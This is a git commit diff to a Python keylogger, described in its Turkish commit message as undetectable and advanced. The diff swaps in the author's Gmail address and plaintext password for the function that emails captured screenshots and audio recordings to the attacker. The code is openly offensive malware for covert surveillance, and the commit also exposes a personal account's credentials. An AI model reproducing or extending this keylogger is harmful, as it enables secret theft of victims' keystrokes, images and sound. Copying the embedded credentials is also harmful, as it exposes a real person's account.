288c98740f5f727a1cd86397c855239ad0d04ead
kaandemir993 <mahmut14331@gmail.com>
2025-04-04 08:23:59 +0300

    üst düzey Keylogger.py
    tespit edilemeyen ve gelişmiş bir keylogger

--- Advnaced Keylogger.py
+++ Advnaced Keylogger.py
@@ -88,8 +88,8 @@ def send_email(path):                               # Email sending function #
     regex4 = re.compile(r'.+\.jpg$')
     regex5 = re.compile(r'.+\.wav$')
 
-    email_address = 'QuiteHacker@instagram.com'         #<--- Enter your email address
-    password = 'QuiteHacker@2021'                       #<--- Enter email password 
+    email_address = 'mahmut14331@gmail.com'         #<--- Enter your email address
+    password = 'KNM.2008'                       #<--- Enter email password 
     
     msg = MIMEMultipart()
     email_base(msg, email_address)
